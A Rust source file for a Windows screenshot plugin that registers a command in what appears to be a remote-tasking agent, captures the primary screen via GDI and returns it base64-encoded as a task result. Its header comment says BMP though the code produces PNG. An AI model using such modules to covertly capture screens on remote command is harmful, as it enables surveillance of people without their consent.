// screenshot plugin — captures the primary screen and returns BMP bytes.
// Enabled via the "screenshot" feature (unloaded/disabled builds have no
// screenshot command).

use crate::protocol::types::Task;
use crate::registry::{AgentCtx, Registry, TaskResult};
use base64::engine::general_purpose::STANDARD as B64;
use base64::Engine;

pub fn register(r: &mut Registry) -> Result<(), String> {
    r.register(crate::protocol::constants::CMD_SCREENSHOT, exec_screenshot)?;
    Ok(())
}

fn exec_screenshot(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    match capture_png() {
        Ok(png) => {
            let b64 = B64.encode(&png);
            Some(TaskResult::ok(&task.id, format!("png:{}", b64)))
        }
        Err(e) => Some(TaskResult::fail(&task.id, format!("screenshot: {e}"))),
    }
}

#[cfg(target_os = "windows")]
fn capture_png() -> Result<Vec<u8>, String> {
    use windows_sys::Win32::Graphics::Gdi::*;
    use windows_sys::Win32::UI::WindowsAndMessaging::GetSystemMetrics;

    unsafe {
        let w = GetSystemMetrics(0) as u32;
        let h = GetSystemMetrics(1) as u32;
        if w == 0 || h == 0 {
            return Err("bad screen metrics".into());
        }

        let hdc = GetDC(std::ptr::null_mut());
        if hdc.is_null() {
            return Err("GetDC failed".into());
        }
        let memdc = CreateCompatibleDC(hdc);
        if memdc.is_null() {
            ReleaseDC(std::ptr::null_mut(), hdc);
            return Err("CreateCompatibleDC failed".into());
        }
        let hbmp = CreateCompatibleBitmap(hdc, w as i32, h as i32);
        if hbmp.is_null() {
            DeleteDC(memdc);
            ReleaseDC(std::ptr::null_mut(), hdc);
            return Err("CreateCompatibleBitmap failed".into());
        }

        let old = SelectObject(memdc, hbmp as *mut _);
        if BitBlt(memdc, 0, 0, w as i32, h as i32, hdc, 0, 0, SRCCOPY) == 0 {
            SelectObject(memdc, old);
            DeleteObject(hbmp as *mut _);
            DeleteDC(memdc);
            ReleaseDC(std::ptr::null_mut(), hdc);
            return Err("BitBlt failed".into());
        }

        let mut bmi: BITMAPINFO = std::mem::zeroed();
        bmi.bmiHeader.biSize = std::mem::size_of::<BITMAPINFOHEADER>() as u32;
        bmi.bmiHeader.biWidth = w as i32;
        bmi.bmiHeader.biHeight = -(h as i32); // top-down
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = 0; // BI_RGB

        let row_bytes = w * 4;
        let img_size = row_bytes * h;
        let mut px = vec![0u8; img_size as usize];

        let got = GetDIBits(
            memdc,
            hbmp,
            0,
            h,
            px.as_mut_ptr() as *mut core::ffi::c_void,
            &mut bmi,
            0,
        );
        if got == 0 {
            SelectObject(memdc, old);
            DeleteObject(hbmp as *mut _);
            DeleteDC(memdc);
            ReleaseDC(std::ptr::null_mut(), hdc);
            return Err("GetDIBits failed".into());
        }

        SelectObject(memdc, old);
        DeleteObject(hbmp as *mut _);
        DeleteDC(memdc);
        ReleaseDC(std::ptr::null_mut(), hdc);

        // GDI 32bpp BI_RGB = BGRA order. Reorder to RGB and encode PNG.
        let mut rgb = Vec::with_capacity((row_bytes / 4 * 3) as usize * h as usize);
        for chunk in px.chunks_exact(4) {
            rgb.push(chunk[2]); // R
            rgb.push(chunk[1]); // G
            rgb.push(chunk[0]); // B
        }

        use image::{ImageEncoder, RgbImage};
        let img = RgbImage::from_raw(w, h, rgb).ok_or("pixel buffer too small")?;
        let mut png_buf = Vec::new();
        let encoder = image::codecs::png::PngEncoder::new(&mut png_buf);
        encoder
            .write_image(img.as_raw(), w, h, image::ExtendedColorType::Rgb8)
            .map_err(|e| format!("png encode: {e}"))?;

        Ok(png_buf)
    }
}

#[cfg(not(target_os = "windows"))]
fn capture_png() -> Result<Vec<u8>, String> {
    Err("screenshot is Windows-only".into())
}
